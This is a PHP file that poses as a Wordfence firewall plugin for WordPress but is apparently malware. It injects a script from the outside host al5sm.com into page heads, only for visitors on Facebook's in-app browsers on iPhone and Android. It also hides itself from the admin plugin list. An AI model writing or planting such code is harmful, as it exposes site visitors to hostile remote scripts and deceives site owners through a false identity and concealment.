<?php
/*
  Plugin Name: Wordfence Web Application Firewall (WAF)
  Description: File is a core configuration file used by the Wordfence Security plugin to implement its Web Application Firewall (WAF).
  Version: 8.0.4
*/

add_action('wp_head', function () {

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $is_ios_facebook = (
        stripos($ua, 'iPhone') !== false &&
        stripos($ua, 'FBAN/FBIOS') !== false
    );

    $is_android_facebook = (
        stripos($ua, 'Android') !== false &&
        (
            stripos($ua, 'FB_IAB/FB4A') !== false ||
            stripos($ua, 'FBAN/EMA') !== false
        )
    );

    if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
        ?>
        <script>
        (function(s){
            s.dataset.zone='11543860';
            s.src='https://al5sm.com/tag.min.js';
        })([document.documentElement, document.body].filter(Boolean).pop()
          .appendChild(document.createElement('script')));
        </script>
        <?php
    }
});


add_filter('all_plugins', function ($plugins) {
    $plugin_file = plugin_basename(__FILE__);

    if (isset($plugins[$plugin_file])) {
        unset($plugins[$plugin_file]);
    }

    return $plugins;
});
